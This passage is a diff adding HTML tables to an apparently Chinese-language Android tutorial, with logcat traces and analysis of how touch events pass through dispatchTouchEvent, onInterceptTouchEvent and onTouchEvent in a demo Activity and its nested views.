+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">05-10 05:34:46.333</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp; TouchEventFather | dispatchTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #339966; font-family: arial,helvetica,sans-serif; font-size: 13px;">I</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">05-10 05:34:46.333</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #339966; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #339966; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">&nbsp; TouchEventFather | onInterceptTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #0000ff; font-family: arial,helvetica,sans-serif; font-size: 13px;">D</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">05-10 05:34:46.333</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #0000ff; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #0000ff; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">&nbsp; TouchEventFather | onTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 05:34:46.333</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | onTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 05:34:46.343</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 05:34:46.343</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | onTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 05:34:46.423</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 05:34:46.423</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | onTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 05:34:46.433</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 05:34:46.433</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp; TouchEventActivity | onTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 05:34:46.442</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_UP</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 05:34:46.442</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | onTouchEvent --&gt; ACTION_UP</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #000000;">结果分析</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">代码运行后，事件首先由 TouchEventActivity 的 dispatchTouchEvent 方法分发给 TouchEventFather 控件的 dispatchTouchEvent，而该控件的 dispatchTouchEvent 返回 super.dispatchTouchEvent(ev)，表示对事件进行分发并向下传递给 TouchEventFather 控件的 onInterceptTouchEvent 方法，该方法返回 true 表示对所获取到的事件进行拦截并将事件传递给 TouchEventFather 控件的 onTouchEvent 进行处理，TouchEventFather 控件的 onTouchEvent 返回 super.onTouchEvent(ev) 表示对事件没有做任何处理直接将事件返回给上级控件，由于 TouchEventFather 获取的事件直接来自 TouchEventActivity，所以 TouchEventFather 控件的 onTouchEvent 会将事件以冒泡方式直接返回给 TouchEventActivity 的 onTouchEvent 进行消费，后续的事件则会跳过 TouchEventFather 直接由 TouchEventActivity 的 onTouchEvent 消费来自 TouchEventActivity 自身分发的事件。<br /></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tbody>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</table>
+<p>&nbsp;<strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Case 4</span></strong></p>
+<table style="border: 0px solid #79787d; width: 980px; background-color: #e4e5e6;" border="0">
+<tbody>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">拦截条件</span></strong></span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">控件名称 </span></strong></td>
+<td style="text-align: center;" colspan="3"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent 返回值</span></strong></td>
+<td style="text-align: center;" colspan="4"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent 返回值</span></strong></td>
+<td style="text-align: center;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onTouchEvent 返回值</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity</span></span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev) </span></span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">--- </span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventFather</span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev) </span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">false</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventChilds</span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev)</span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onInterceptTouchEvent(ev)</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">运行结果</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Level</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Time</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">PID</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Application</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Tag</span></span></span></span></span></span></td>
+<td style="text-align: center;" colspan="5">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Text</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 06:31:47.565</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">E</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">05-10 06:31:47.565</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp; TouchEventFather | dispatchTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">I</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">05-10 06:31:47.565</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #339966; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">&nbsp;&nbsp;TouchEventFather | onInterceptTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">E</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">05-10 06:31:47.565</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;&nbsp;TouchEventChilds | dispatchTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">I</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">05-10 06:31:47.565</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #339966; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #339966;">&nbsp;&nbsp;TouchEventChilds | onInterceptTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">D</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">05-10 06:31:47.565</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #0000ff; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">&nbsp;&nbsp;TouchEventChilds | onTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">D</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">05-10 06:31:47.565</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #0000ff; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #0000ff;">&nbsp;&nbsp;TouchEventFather | onTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 06:31:47.565</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;&nbsp;TouchEventActivity | onTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 06:31:47.652</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;&nbsp;TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 06:31:47.652</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;&nbsp;TouchEventActivity | onTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 06:31:47.732</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;&nbsp;TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 06:31:47.732</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;&nbsp;TouchEventActivity | onTouchEvent --&gt; ACTION_MOVE</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 06:31:47.812</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">512</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></td>
